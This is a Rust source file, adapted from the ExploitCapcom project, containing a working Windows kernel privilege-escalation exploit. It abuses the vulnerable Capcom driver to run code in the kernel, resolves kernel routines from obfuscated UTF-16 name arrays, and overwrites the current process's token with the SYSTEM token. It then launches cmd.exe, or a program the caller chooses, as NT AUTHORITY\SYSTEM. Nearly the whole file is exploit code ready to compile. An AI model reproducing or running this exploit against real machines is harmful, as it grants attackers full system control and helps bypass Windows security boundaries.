/*!
Launch an elevated command prompt with NT AUTHORITY\SYSTEM privileges.

Adapted from https://github.com/tandasat/ExploitCapcom
 */

// Only available to 64-bit windows targets.
#![cfg(all(windows, target_pointer_width = "64"))]

use std::{mem, ptr};

use winapi::shared::minwindef::{FALSE};
use winapi::shared::ntdef::{UNICODE_STRING, PVOID, NTSTATUS, HANDLE};
use winapi::um::winnt::{PACCESS_TOKEN};
use winapi::um::winbase::{CREATE_NEW_CONSOLE};
use winapi::um::processthreadsapi::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION};
use winapi::um::processenv::{GetCommandLineW};
use winapi::um::shellapi::{CommandLineToArgvW};

static PS_LOOKUP_PROCESS_BY_PROCESS_ID_NO_NUL: [u16; 26] = [80u16, 115, 76, 111, 111, 107, 117, 112, 80, 114, 111, 99, 101, 115, 115, 66, 121, 80, 114, 111, 99, 101, 115, 115, 73, 100];
static OB_DEREFERENCE_OBJECT_NO_NUL: [u16; 19] = [79u16, 98, 68, 101, 114, 101, 102, 101, 114, 101, 110, 99, 101, 79, 98, 106, 101, 99, 116];
static PS_REFERENCE_PRIMARY_TOKEN_NO_NUL: [u16; 23] = [80u16, 115, 82, 101, 102, 101, 114, 101, 110, 99, 101, 80, 114, 105, 109, 97, 114, 121, 84, 111, 107, 101, 110];
static PS_DEREFERENCE_PRIMARY_TOKEN_NO_NUL: [u16; 25] = [80u16, 115, 68, 101, 114, 101, 102, 101, 114, 101, 110, 99, 101, 80, 114, 105, 109, 97, 114, 121, 84, 111, 107, 101, 110];
static PS_GET_CURRENT_PROCESS_ID_NO_NUL: [u16; 21] = [80u16, 115, 71, 101, 116, 67, 117, 114, 114, 101, 110, 116, 80, 114, 111, 99, 101, 115, 115, 73, 100];
static PS_INITIAL_SYSTEM_PROCESS_NO_NUL: [u16; 22] = [80u16, 115, 73, 110, 105, 116, 105, 97, 108, 83, 121, 115, 116, 101, 109, 80, 114, 111, 99, 101, 115, 115];

type PEPROCESS = PVOID;

macro_rules! get_system_routine_address {
	($ctx:expr, $ty:ty, $ws:expr) => {{
		let ws = &$ws;
		let mut us = UNICODE_STRING {
			Length: mem::size_of_val(ws) as u16,
			MaximumLength: mem::size_of_val(ws) as u16,
			Buffer: ws.as_ptr() as *mut u16,
		};
		mem::transmute::<_, $ty>(($ctx.get_system_routine_address)(&mut us))
	}};
}

fn main() {
	let result = capcom0::setup(|_, device| {
		let mut success = false;
		unsafe {
			#[allow(non_snake_case)]
			device.elevate(|ctx| {
				let PsGetCurrentProcessId = get_system_routine_address!(ctx,
					unsafe extern "system" fn() -> HANDLE,
					PS_GET_CURRENT_PROCESS_ID_NO_NUL);
				let PsLookupProcessByProcessId = get_system_routine_address!(ctx,
					unsafe extern "system" fn(HANDLE, *mut PEPROCESS) -> NTSTATUS,
					PS_LOOKUP_PROCESS_BY_PROCESS_ID_NO_NUL);
				let ObDereferenceObject = get_system_routine_address!(ctx,
					unsafe extern "system" fn(PVOID),
					OB_DEREFERENCE_OBJECT_NO_NUL);
				let PsReferencePrimaryToken = get_system_routine_address!(ctx,
					unsafe extern "system" fn(PEPROCESS) -> PACCESS_TOKEN,
					PS_REFERENCE_PRIMARY_TOKEN_NO_NUL);
				let PsDereferencePrimaryToken = get_system_routine_address!(ctx,
					unsafe extern "system" fn(PACCESS_TOKEN),
					PS_DEREFERENCE_PRIMARY_TOKEN_NO_NUL);
				let SystemProcess = *get_system_routine_address!(ctx,
					*mut PEPROCESS,
					PS_INITIAL_SYSTEM_PROCESS_NO_NUL);

				// Early safety check...
				if SystemProcess == ptr::null_mut() {
					return;
				}

				// Get the process object of the current process
				let mut CurrentProcess = ptr::null_mut();
				let Status = PsLookupProcessByProcessId(PsGetCurrentProcessId(), &mut CurrentProcess);
				if Status < 0 {
					return;
				}

				let CurrentToken = PsReferencePrimaryToken(CurrentProcess);
				let SystemToken = PsReferencePrimaryToken(SystemProcess);

				// Search the token field from EPROCESS up to a 0x80 pointers size
				for Offset in 0..0x80 {
					let TestAddress = (CurrentProcess as *mut usize).offset(Offset);
					let ProbableToken = (*TestAddress & !0xf) as PACCESS_TOKEN;
					if ProbableToken == CurrentToken {
						let TokenAddress = TestAddress as *mut PACCESS_TOKEN;
						*TokenAddress = SystemToken;
						success = true;
						break;
					}
				}

				PsDereferencePrimaryToken(CurrentToken);
				PsDereferencePrimaryToken(SystemToken);
				ObDereferenceObject(CurrentProcess);
			});
			success
		}
	});
	match result {
		Err(e) => eprintln!("{}", e),
		Ok(true) => {
			if launch() {
				println!("Cmd launched with 'NT AUTHORITY\\SYSTEM' privileges.");
			}
			else {
				eprintln!("Failed to launch the cmd.");
			}
		},
		Ok(false) => {
			eprintln!("Failed to steal the SYSTEM token.");
		},
	}
}

static mut COMMAND_LINE: [u16; 28] = /*C:\Windows\System32\cmd.exe*/[67u16, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 99, 109, 100, 46, 101, 120, 101, 0];
fn launch() -> bool {
	unsafe {
		let mut num_args = mem::uninitialized();
		let cmd_args = CommandLineToArgvW(GetCommandLineW(), &mut num_args);

		let app_name = if num_args > 1 { *cmd_args.offset(1) }
		else { COMMAND_LINE.as_mut_ptr() };

		let cmd_line = if num_args > 2 { *cmd_args.offset(2) }
		else { ptr::null_mut() };

		let mut process_info: PROCESS_INFORMATION = mem::uninitialized();
		let mut startup_info: STARTUPINFOW = mem::zeroed();
		startup_info.cb = mem::size_of::<STARTUPINFOW>() as u32;
		let result = CreateProcessW(app_name, cmd_line, ptr::null_mut(), ptr::null_mut(), FALSE, CREATE_NEW_CONSOLE, ptr::null_mut(), ptr::null_mut(), &mut startup_info, &mut process_info) != FALSE;

		// Leak all the resources :)
		return result;
	}
}
